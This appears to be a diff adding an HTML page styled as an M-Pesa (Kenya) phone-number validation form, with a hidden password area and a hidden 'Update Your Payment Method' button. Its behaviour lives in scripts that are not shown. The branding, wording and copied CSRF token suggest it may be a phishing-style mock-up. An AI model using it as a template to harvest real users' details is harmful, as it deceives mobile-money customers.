@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Mpesa - Phone Number Validation (KE)</title>
+  <link rel="stylesheet" href="./style.css">
+<!--    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>-->
+    <script  src="./jquery.js"></script>
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<section class="container" id="main-content" tabindex="-1">
+
+    <div class="acct-notifications">
+
+            <form method="post" action="" _lpchecked="1" autocomplete="off">
+                <label class="smallcaps-heading mobile-phone-heading" for="mobile-phone-number">Mobile phone number:</label>
+                <div class="form-row align-items-center">
+                    <div class="col-auto form-input-col">
+                    <input type="hidden" name="csrfmiddlewaretoken" value="JKdw9iIYBmZFvVdLFHssPLJuzmsm0UIxhtaWCLCtQgxn59h3vLpXMmUz5rQoJX5o">
+                    <input type="tel" name="mobile_phone" maxlength="25" pattern="[0-9-]{11,12}" autocomplete="off" title="Please use only numbers with no special characters" placeholder="####-###-###" id="mobile-phone-number" class="form-control acct-mobile-number">
+                    </div>
+                </div>
+
+                 <p class="result"></p>
+
+                <div id="pwd" style="display: none">
+                </div>
+                <div class="col-auto form-button-col acct-mobile-submit">
+                    <button class="btn btn-primary align-right" type="submit"  disabled style="display:block; background-color: red;" id="clear_input">Clear Input</button>
+                </div>
+
+                <div class="col-auto form-button-col acct-mobile-submit">
+                    <button class="btn btn-primary align-right" type="submit"  disabled style="display:none;" id="disable_me">Click to Update Your Payment Method</button>
+                </div>
+            </form>
+
+    </div>
+</section>
+
+  <script  src="./login_script.js"></script>
+
+</body>
+</html>
